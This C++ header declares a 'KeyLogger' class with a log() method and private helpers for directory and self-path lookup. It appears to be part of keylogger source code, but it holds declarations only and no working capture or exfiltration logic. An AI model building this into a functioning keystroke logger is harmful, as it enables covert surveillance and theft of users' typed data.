#ifndef KEY_LOGGER_H
#define KEY_LOGGER_H

#include <cstdlib>
#include <string>
using namespace std;

class KeyLogger {

public:
  void log();

private:
  string intToString(int i);
  string getCurrDir();
  string getSelfPath();
  string dirBasename(string path);
};

#endif // KEY_LOGGER_H
